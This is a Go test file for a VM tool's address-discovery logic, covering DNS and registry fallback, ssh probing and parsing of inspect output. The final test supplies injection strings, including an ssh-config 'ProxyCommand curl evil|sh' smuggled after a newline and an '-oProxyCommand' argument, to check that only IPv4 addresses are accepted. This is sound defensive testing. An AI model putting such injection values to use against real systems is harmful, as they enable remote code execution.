package backend

import (
	"context"
	"strings"
	"testing"

	"github.com/mutms/mpd-virt/go/internal/registry"
	"github.com/mutms/mpd-virt/go/internal/vmid"
)

func mustID(t *testing.T, s string) vmid.ID {
	t.Helper()
	id, err := vmid.Parse(s)
	if err != nil {
		t.Fatalf("vmid.Parse(%q): %v", s, err)
	}
	return id
}

// stub replaces the two effects the generic path has on the world for one test:
// what a name resolves to (dns), and which addresses answer on ssh (live).
func stub(t *testing.T, dns []string, live ...string) {
	t.Helper()
	liveSet := map[string]bool{}
	for _, ip := range live {
		liveSet[ip] = true
	}
	origResolve, origReach := resolveHost, sshReachable
	resolveHost = func(context.Context, string) []string { return dns }
	sshReachable = func(_ context.Context, ip string) bool { return liveSet[ip] }
	t.Cleanup(func() { resolveHost, sshReachable = origResolve, origReach })
}

// isolateRegistry points the registry at an empty temp root, so a test starts
// with no VMs on file and cannot touch the developer's real ~/.mpd-virt.
func isolateRegistry(t *testing.T) {
	t.Helper()
	t.Setenv("MPD_VIRT_ROOT", t.TempDir())
}

func seedLastIP(t *testing.T, id vmid.ID, ip string) {
	t.Helper()
	if err := registry.Save(registry.Entry{ID: id, IP: ip, User: "skodak"}); err != nil {
		t.Fatalf("seed registry: %v", err)
	}
}

// The generic path: a name that resolves to a live VM wins — no registry needed.
func TestLocateName(t *testing.T) {
	isolateRegistry(t)
	stub(t, []string{"10.1.1.143"}, "10.1.1.143")
	got, err := locate(context.Background(), mustID(t, "139"), Generic)
	if err != nil {
		t.Fatal(err)
	}
	if got != "10.1.1.143" {
		t.Errorf("locate = %q, want 10.1.1.143 (resolved by name)", got)
	}
}

// A name that resolves but does not answer ssh (stale record) is skipped for
// the last IP on file.
func TestLocateFallsBackToLastIP(t *testing.T) {
	isolateRegistry(t)
	id := mustID(t, "139")
	seedLastIP(t, id, "10.1.1.143")
	stub(t, []string{"10.9.9.9"}, "10.1.1.143") // dns record dead, registry IP live
	got, err := locate(context.Background(), id, Generic)
	if err != nil {
		t.Fatal(err)
	}
	if got != "10.1.1.143" {
		t.Errorf("locate = %q, want the last IP 10.1.1.143", got)
	}
}

// Among several resolved addresses, the one answering ssh is chosen.
func TestLocatePicksLiveAddress(t *testing.T) {
	isolateRegistry(t)
	stub(t, []string{"10.0.0.5", "10.1.1.143"}, "10.1.1.143")
	got, err := locate(context.Background(), mustID(t, "139"), Generic)
	if err != nil {
		t.Fatal(err)
	}
	if got != "10.1.1.143" {
		t.Errorf("locate = %q, want 10.1.1.143 (the live one)", got)
	}
}

// No name and nothing on file: locate errors saying there is no candidate.
func TestLocateNoCandidates(t *testing.T) {
	isolateRegistry(t)
	stub(t, nil) // nothing resolves, nothing live
	_, err := locate(context.Background(), mustID(t, "205"), Generic)
	if err == nil {
		t.Fatal("want an error when nothing resolves and no IP is on file")
	}
	if !strings.Contains(err.Error(), "no candidate address") {
		t.Errorf("error should say there is no candidate, got: %v", err)
	}
}

// Candidates exist but none answer ssh: the error names them.
func TestLocateAllDead(t *testing.T) {
	isolateRegistry(t)
	id := mustID(t, "139")
	seedLastIP(t, id, "10.1.10.1")
	stub(t, []string{"10.0.0.5"}) // a dns record and a registry IP, neither live
	_, err := locate(context.Background(), id, Generic)
	if err == nil {
		t.Fatal("want an error when no candidate answers ssh")
	}
	for _, want := range []string{"10.0.0.5", "10.1.10.1"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q should mention candidate %q", err.Error(), want)
		}
	}
}

// The same IP from both DNS and the registry is probed once, not twice.
func TestLocateDedupes(t *testing.T) {
	isolateRegistry(t)
	id := mustID(t, "139")
	seedLastIP(t, id, "10.1.1.143")
	probes := 0
	origResolve, origReach := resolveHost, sshReachable
	resolveHost = func(context.Context, string) []string { return []string{"10.1.1.143"} }
	sshReachable = func(context.Context, string) bool { probes++; return true }
	t.Cleanup(func() { resolveHost, sshReachable = origResolve, origReach })

	got, err := locate(context.Background(), id, Generic)
	if err != nil {
		t.Fatal(err)
	}
	if got != "10.1.1.143" {
		t.Errorf("locate = %q, want 10.1.1.143", got)
	}
	if probes != 1 {
		t.Errorf("a deduped IP should be probed once, got %d probes", probes)
	}
}

// inspectFixture is real `container inspect mpd-181` output (trimmed): the live
// address is under status.networks[].ipv4Address in CIDR form.
const inspectFixture = `[
  {
    "configuration" : { "id" : "mpd-181", "networks" : [ { "network" : "default" } ] },
    "id" : "mpd-181",
    "status" : {
      "networks" : [ { "ipv4Address" : "192.168.64.26/24", "network" : "default" } ],
      "state" : "running"
    }
  }
]`

func TestParseContainerIP(t *testing.T) {
	got, err := parseContainerIP(inspectFixture)
	if err != nil {
		t.Fatal(err)
	}
	if got != "192.168.64.26" {
		t.Errorf("parseContainerIP = %q, want 192.168.64.26 (from status, mask stripped)", got)
	}
}

// prlctlFixture is real `prlctl list mpd-130 -f --json` output: the address is
// the bare "ip_configured" string.
const prlctlFixture = `[
    { "uuid": "bb586bcf", "status": "running", "ip_configured": "10.211.55.130", "name": "mpd-130" }
]`

func TestParseParallelsIP(t *testing.T) {
	got, err := parseParallelsIP(prlctlFixture)
	if err != nil {
		t.Fatal(err)
	}
	if got != "10.211.55.130" {
		t.Errorf("parseParallelsIP = %q, want 10.211.55.130", got)
	}
}

// Discovery consumes attacker-influenceable strings (guest-reported prlctl
// fields, mDNS answers). Whatever a source claims, only literal IPv4
// addresses may become candidates — a token carrying ssh-config syntax or
// a hostname must never reach the registry or ~/.ssh/config.
func TestLocateRejectsNonAddressCandidates(t *testing.T) {
	isolateRegistry(t)
	junk := []string{
		"evil.example.com",
		"10.1.1.5\nProxyCommand curl evil|sh",
		"-oProxyCommand=evil",
		"fe80::1",
		"999.1.1.1",
	}
	stub(t, append(junk, "10.1.1.143"), "10.1.1.143")
	got, err := locate(context.Background(), mustID(t, "139"), Generic)
	if err != nil {
		t.Fatal(err)
	}
	if got != "10.1.1.143" {
		t.Errorf("locate = %q, want the one valid address 10.1.1.143", got)
	}

	// And when only junk is offered, locate reports no candidates at all —
	// the junk must not even be probed.
	stub(t, junk, junk...)
	if _, err := locate(context.Background(), mustID(t, "139"), Generic); err == nil ||
		!strings.Contains(err.Error(), "no candidate") {
		t.Errorf("junk-only discovery should yield 'no candidate', got %v", err)
	}
}
